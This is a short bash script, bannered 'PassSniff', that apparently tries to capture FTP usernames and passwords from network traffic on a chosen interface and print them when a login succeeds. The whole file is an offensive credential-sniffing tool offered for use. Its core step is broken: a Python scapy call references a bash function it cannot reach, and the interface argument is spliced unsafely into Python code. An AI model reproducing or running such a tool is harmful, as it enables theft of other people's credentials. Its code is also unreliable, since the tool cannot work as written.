#!/bin/bash
echo "
 __________                        _________      .__  _____  _____ 
\______   \_____    ______ ______/   _____/ ____ |__|/ ____\/ ____\
 |     ___/\__  \  /  ___//  ___/\_____  \ /    \|  \   __\\   __\ 
 |    |     / __ \_\___ \ \___ \ /        \   |  \  ||  |   |  |   
 |____|    (____  /____  >____  >_______  /___|  /__||__|   |__|   
                \/     \/     \/        \/     \/                  
"

if ! python3 -c 'import scapy' &> /dev/null; then
    echo "[!] Error: Scapy Installation Not Found"
    exit 1
fi

sniff_credentials() {
    interface=$1
    username="Error: Unlucky Timing"
    password="Error: Unlucky Timing"

    check_login() {
        pkt=$1
        if echo "$pkt" | grep -q '230'; then
            echo "[*] Valid Credentials Found..."
            echo -e "\t[*] $(echo "$pkt" | awk -F '[ IP,\\s]+' '{print $6}') -> $(echo "$pkt" | awk -F '[ IP,\\s]+' '{print $8}'):"
            echo -e "\t [*] Username: $username"
            echo -e "\t [*] Password: $password\n"
        fi
    }

    check_for_ftp() {
        pkt=$1
        if echo "$pkt" | grep -q 'FTP'; then
            return 0
        else
            return 1
        fi
    }

    check_pkt() {
        pkt=$1
        if check_for_ftp "$pkt"; then
            data=$(echo "$pkt" | grep -oE 'USER .*|PASS .*')
            if echo "$data" | grep -q 'USER'; then
                username=$(echo "$data" | awk '{print $2}')
            elif echo "$data" | grep -q 'PASS'; then
                password=$(echo "$data" | awk '{print $2}')
            fi
        fi
        check_login "$pkt"
    }

    echo "[*] Sniffing Started on $interface ..."
    sudo python3 -c "from scapy.all import *; sniff(iface='$interface', prn=check_pkt, store=0)"

    if [ $? -ne 0 ]; then
        echo "[!] Error: Failed to Initialize Sniffing"
        exit 1
    fi

    echo -e "\n[*] Sniffing Stopped"
}

if [ $# -ne 1 ]; then
    echo "Usage: $0 <interface>"
    exit 1
fi

sniff_credentials "$1"
